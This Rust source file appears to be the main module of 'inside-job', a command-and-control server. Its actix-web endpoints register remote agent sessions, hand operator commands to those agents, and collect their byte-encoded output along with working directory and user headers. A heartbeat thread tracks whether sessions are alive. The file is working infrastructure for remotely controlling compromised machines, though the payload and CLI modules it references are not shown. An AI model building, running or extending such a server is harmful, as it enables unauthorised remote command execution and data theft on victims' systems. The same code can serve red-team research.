use std::{collections::HashMap, sync::{Mutex, Arc}, time::SystemTime, thread};
use actix_web::{HttpServer, App, web::{self, Bytes}, Responder, get, post, HttpResponseBuilder, http::StatusCode, HttpRequest};
use lazy_static::lazy_static;
use openssl::ssl::{SslAcceptor, SslMethod, SslFiletype};
use docopt::Docopt;
use serde::Deserialize;
use uuid::Uuid;
use cli::Session;

use crate::cli::State;
mod cli;
mod payload;
lazy_static! {
    static ref APPLICATION: Arc<Mutex<Application>> = Arc::new(Mutex::new(Application::default()));
}

const USAGE: &'static str = "
inside-job

Usage: 
    inside-job [-a ADDRESS] [-p PORT]
    inside-job [-a ADDRESS] [-p PORT] --key PATH --cert PATH
    inside-job (-h | --help)

Options:
    -h, --help                      Show this screen.
    -a ADDRESS, --address ADDRESS   Define the address [default: 0.0.0.0].
    -p PORT, --port PORT            Define the port for the web server [default: 8080].
    --key PATH                      Add TLS key in PEM format.
    --cert PATH                     Add TLS cert in PEM format.
";

#[derive(Debug, Deserialize)]
pub struct Option {
    flag_address: String,
    flag_port: usize,
    flag_key: String,
    flag_cert: String
}

pub struct Application {
    pub sessions: HashMap<Uuid, Session>,
    pub secure: bool,
    pub port: usize,
}

impl Default for Application {
    fn default() -> Self {
        Self { sessions: HashMap::new(), secure: false, port: 8080 }
    }
}

#[get("/")]
async fn index(req: HttpRequest) -> impl Responder {
    if let Ok(mut data) = APPLICATION.lock() {
        let uuid = Uuid::new_v4();
        data.sessions.insert(uuid, Session::default());
        println!("Established session [{}] from {}", uuid.to_string(), req.connection_info().peer_addr().unwrap());
        return uuid.to_string()
    }
    return "".to_owned();
}

#[get("/{uuid}")]
async fn cmd_input(path: web::Path<(String,)>, req: HttpRequest) -> impl Responder {
    if let Ok(mut data) = APPLICATION.lock() {
        if let Ok(uuid) = Uuid::parse_str(path.0.as_str()) {
            if let Some(session) = data.sessions.get_mut(&uuid) {
                session.last_interaction = SystemTime::now();
                session.state = State::ALIVE;
                if let Some(dir) = req.headers().get("x-Dir") {
                    session.pwd = dir.to_str().expect("Failed to parse directory string.").to_string()
                }
                if let Some(user) = req.headers().get("x-User") {
                    session.user = user.to_str().expect("Failed to parse user string.").to_string()
                }
                if session.current_input.1 {
                    let command = session.current_input.0.to_string();
                    session.input_history.push((command.to_string(), SystemTime::now()));
                    session.current_input = ("".to_string(), false);
                    return command
                }
            }
        }
    }
    return "".to_owned()
}

#[post("/{uuid}")]
async fn cmd_output(path: web::Path<(String,),>, bytes: Bytes, req: HttpRequest) -> impl Responder {
    if let Ok(mut data) = APPLICATION.lock() {
        if let Ok(uuid) = Uuid::parse_str(path.0.as_str()) {
            if let Some(session) = data.sessions.get_mut(&uuid) {
                if let Ok(body) = String::from_utf8(bytes.to_vec()) {
                    if let Ok(body) = String::from_utf8(body.split(" ").map(|s| u8::from_str_radix(s, 10).unwrap_or(0)).collect::<Vec<u8>>()) {
                        println!("{body}");
                        if let Some(dir) = req.headers().get("x-Dir") {
                            session.pwd = dir.to_str().expect("Failed to parse directory string.").to_string()
                        }
                        if let Some(user) = req.headers().get("x-User") {
                            session.user = user.to_str().expect("Failed to parse user string.").to_string()
                        }
                        session.output_history.push((body, SystemTime::now()));
                        session.last_interaction = SystemTime::now();
                        return HttpResponseBuilder::new(StatusCode::ACCEPTED)
                    }
                }
                return HttpResponseBuilder::new(StatusCode::BAD_REQUEST)
            }       
        }
    }
    return HttpResponseBuilder::new(StatusCode::NOT_FOUND)
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let args: Option = Docopt::new(USAGE)
        .and_then(|d| d.deserialize())
        .unwrap_or_else(|e| e.exit());

    let secure = args.flag_cert.len() > 0 && args.flag_key.len() > 0;
    if let Ok(mut app) = APPLICATION.lock() {
        app.secure = secure;
        app.port = args.flag_port;
    }
    
    let mut server = HttpServer::new(|| {
        App::new()
        .service(index)
        .service(cmd_input)
        .service(cmd_output)
    });
    if secure {
        let mut builder = SslAcceptor::mozilla_intermediate(SslMethod::tls()).unwrap();
        builder
            .set_private_key_file(args.flag_key, SslFiletype::PEM)
            .unwrap();
        builder.set_certificate_chain_file(args.flag_cert).unwrap();
        server = server.bind_openssl(format!("{}:{}", args.flag_address, args.flag_port), builder)?;
    } else {
        server = server.bind(format!("{}:{}", args.flag_address, args.flag_port))?;
    }
    let _handle_cli = thread::spawn(move || cli::cli());
    let _handle_hearth_beat = thread::spawn(move || hearth_beat());
    server
    .run()
    .await
}

fn hearth_beat() {
    loop {
        if let Ok(mut application) = APPLICATION.lock() {
            for (_k, session) in application.sessions.iter_mut() {
                if let Ok(duration) = SystemTime::now().duration_since(session.last_interaction) {
                    if duration.as_secs() > 4 {
                        session.state = State::DEAD
                    } else if duration.as_secs() > 2 {
                        session.state = State::UNKNOWN
                    }
                }
            }
        }
    }
}